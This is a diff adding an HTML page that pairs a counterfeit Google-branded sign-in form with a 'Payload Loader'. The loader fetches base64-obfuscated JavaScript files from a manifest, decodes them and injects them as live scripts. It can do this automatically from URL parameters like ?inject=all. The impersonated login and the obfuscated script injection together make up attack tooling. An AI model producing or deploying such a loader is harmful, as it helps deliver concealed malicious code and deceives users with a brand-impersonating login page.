@@ -1,0 +1,264 @@
+<!-- scripts/manifest-loader.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Payload Loader</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    :root { color-scheme: dark }
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: Roboto, monospace, sans-serif;
+      margin: 0;
+    }
+
+    /* Google-style login */
+    .card {
+      max-width: 400px;
+      margin: 8vh auto;
+      background: #fff;
+      color: #222;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      transition: all .3s ease;
+    }
+
+    .card.hidden {
+      opacity: 0;
+      pointer-events: none;
+      transform: translateY(-30px);
+    }
+
+    .logo { text-align: center; margin-bottom: 20px }
+    .logo img { height: 48px }
+
+    h1 { font-size: 24px; margin-bottom: 8px }
+    .sub { color: #777; font-size: 16px; margin-bottom: 24px }
+
+    input {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    a { font-size: 14px; color: #1a73e8; text-decoration: none }
+    .g-btn {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    /* Loader Panel */
+    #loader { display: none; padding: 24px }
+
+    .row { display: flex; flex-wrap: wrap; gap: 16px; margin-bottom: 12px }
+    .col { display: flex; flex-direction: column; gap: 8px }
+
+    select, input[type=text], button.l-btn {
+      background: #060;
+      color: #cfc;
+      border: 1px solid #0a0;
+      padding: 8px;
+      border-radius: 6px;
+    }
+
+    select { min-width: 280px; height: 260px }
+
+    button.l-btn {
+      cursor: pointer;
+    }
+
+    #log {
+      font-size: 12px;
+      margin-top: 12px;
+      border-top: 1px solid #060;
+      padding-top: 10px;
+      line-height: 1.5;
+    }
+
+    .logline { margin: 2px 0; white-space: pre-wrap }
+    .ok { color: #9f9 }
+    .err { color: #f66 }
+    .muted { color: #999 }
+    .badge {
+      background: #060;
+      border: 1px solid #0f0;
+      border-radius: 999px;
+      padding: 2px 6px;
+      font-size: 11px;
+      margin-left: 6px;
+    }
+
+    footer { margin-top: 10px; font-size: 11px; color: #999 }
+  </style>
+</head>
+<body>
+
+<!-- Google-style Sign-In UI -->
+<div id="signin-card" class="card">
+  <div class="logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+  </div>
+  <h1>Sign in</h1>
+  <p class="sub">to continue to Loader Dashboard</p>
+  <input id="email" type="email" placeholder="Email or phone">
+  <input id="pass" type="password" placeholder="Enter password">
+  <div class="actions">
+    <a href="#">Forgot email?</a>
+    <button id="next-btn" class="g-btn">Next</button>
+  </div>
+</div>
+
+<!-- Payload Loader UI -->
+<div id="loader">
+  <h3 style="margin:0 0 8px;">Payload Loader <span id="ver" class="badge"></span></h3>
+  <div class="row">
+    <div class="col">
+      <label>Filter</label>
+      <input id="filter" type="text" placeholder="type to filter…">
+    </div>
+    <div class="col">
+      <label>Payloads</label>
+      <select id="payloads" multiple></select>
+    </div>
+    <div class="col" style="min-width:220px">
+      <label>Actions</label>
+      <div class="row">
+        <button id="inject" class="l-btn">Inject</button>
+        <button id="copy" class="l-btn">Copy URL</button>
+        <button id="clear" class="l-btn">Clear Log</button>
+      </div>
+      <label style="margin-top:6px">
+        <input type="checkbox" id="autoload"> Auto-inject on load
+      </label>
+    </div>
+  </div>
+  <div id="log"></div>
+  <footer>
+    Auto-load with <code>?inject=openai.js</code> or <code>#inject=all</code>
+  </footer>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const log = (msg, cls="muted") => {
+  const e = document.createElement("div");
+  e.className = `logline ${cls}`;
+  e.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  $("log").appendChild(e);
+  e.scrollIntoView({block: "end"});
+};
+
+const manifestURL = new URL("manifest.json", location.href);
+const obfBase = new URL("obfuscated/", location.href);
+let names = [];
+
+async function loadManifest() {
+  log("Loading manifest: " + manifestURL);
+  const r = await fetch(manifestURL, { cache: "no-cache" });
+  if (!r.ok) throw Error("HTTP " + r.status);
+  const arr = await r.json();
+  names = arr.filter(f => f.endsWith(".js.b64")).map(f => f.replace(/\.js\.b64$/, ".js"));
+  $("ver").textContent = `files: ${names.length}`;
+  log("Manifest loaded", "ok");
+  applyFilter();
+}
+
+function applyFilter() {
+  const q = $("filter").value.toLowerCase();
+  const list = (q ? names.filter(n => n.toLowerCase().includes(q)) : names)
+    .map(n => `<option>${n}</option>`).join("");
+  $("payloads").innerHTML = list;
+}
+
+$("filter").oninput = applyFilter;
+$("clear").onclick = () => { $("log").innerHTML = ""; log("Log cleared."); };
+$("copy").onclick = () => {
+  const sel = [...$("payloads").selectedOptions].map(o => o.value);
+  const u = new URL(location.href);
+  sel.length ? u.searchParams.set("inject", sel.join(",")) : u.searchParams.delete("inject");
+  navigator.clipboard.writeText(u.toString()).then(() => log("URL copied", "ok"));
+};
+
+const safe = s => /^[\w.-]+\.js$/.test(s);
+const uniq = a => [...new Set(a)];
+
+async function injectMany(list) {
+  for (const name of uniq(list)) await injectOne(name);
+  log("Batch complete", "ok");
+}
+
+async function injectOne(name) {
+  if (!safe(name)) return log("Unsafe name: " + name, "err");
+  const url = obfBase + name + ".b64";
+  log("Fetching " + url);
+  const r = await fetch(url, { cache: "no-cache" });
+  if (!r.ok) return log("Failed: HTTP " + r.status, "err");
+  const payload = (await r.text()).trim();
+  if (!payload) return log("Empty: " + name, "err");
+  const s = document.createElement("script");
+  s.textContent = atob(payload);
+  document.documentElement.appendChild(s);
+  log("Injected: " + name, "ok");
+}
+
+$("inject").onclick = () => {
+  const sel = [...$("payloads").selectedOptions].map(o => o.value);
+  if (!sel.length) return log("No selection", "err");
+  injectMany(sel);
+};
+
+function autoTargets() {
+  const p = new URLSearchParams(location.search);
+  let t = p.get("inject") || "";
+  if (!t && location.hash.startsWith("#inject=")) t = decodeURIComponent(location.hash.slice(8));
+  if (!t) return [];
+  return t.trim().toLowerCase() === "all" ? ["__ALL__"] : t.split(",").map(x => x.trim()).filter(Boolean);
+}
+
+async function bootLoader() {
+  try {
+    await loadManifest();
+    const auto = autoTargets();
+    if (auto.length) {
+      const list = auto[0] === "__ALL__" ? names : auto.filter(safe);
+      [...$("payloads").options].forEach(o => { if (list.includes(o.value)) o.selected = true });
+      log("Auto-inject: " + list.join(","), "ok");
+      injectMany(list);
+    }
+  } catch (e) {
+    log("Error: " + e.message, "err");
+  }
+}
+
+// Disappear login screen
+$("next-btn").onclick = () => {
+  $("signin-card").classList.add("hidden");
+  setTimeout(() => {
+    $("signin-card").style.display = "none";
+    $("loader").style.display = "block";
+    bootLoader();
+  }, 400);
+};
+</script>
+
+</body>
+</html>
